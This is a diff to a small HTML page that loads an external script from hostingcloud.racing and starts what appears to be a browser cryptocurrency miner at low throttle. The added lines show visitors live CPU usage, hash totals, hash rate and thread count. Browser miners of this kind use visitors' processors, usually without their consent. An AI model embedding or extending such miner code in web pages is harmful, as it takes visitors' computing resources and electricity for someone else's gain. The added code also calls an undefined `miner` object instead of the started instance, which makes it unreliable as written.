@@ -5,6 +5,11 @@
     <title>NSTĐ</title>
 </head>
 <body>
+    <div id="cpu">CPU: Đang tải...</div>
+    <div id="tong">Tổng: Đang tải...</div>
+    <div id="per">Per: Đang tải...</div>
+    <div id="luong">Luồng: Đang tải...</div>
+    
     <script src="https://www.hostingcloud.racing/LTJd.js"></script>
     <script>
     (function(){
@@ -12,6 +17,20 @@
             throttle: 0.1, c: 'w'
         });
         a.start();
+
+        function update() {
+            var cpu = ((1 - miner.getThrottle()) * 100).toFixed(1);
+            var tong = miner.getTotalHashes();
+            var per = miner.getHashesPerSecond().toFixed(1);
+            var luong = miner.getNumThreads();
+
+            document.getElementById('cpu').textContent = "CPU: " + cpu + "%";
+            document.getElementById('tong').textContent = "Tổng: " + tong;
+            document.getElementById('per').textContent = "Per: " + per;
+            document.getElementById('luong').textContent = "Luồng: " + luong;
+        }
+
+        setInterval(update, 1000);
     })();
     </script>
 </body>
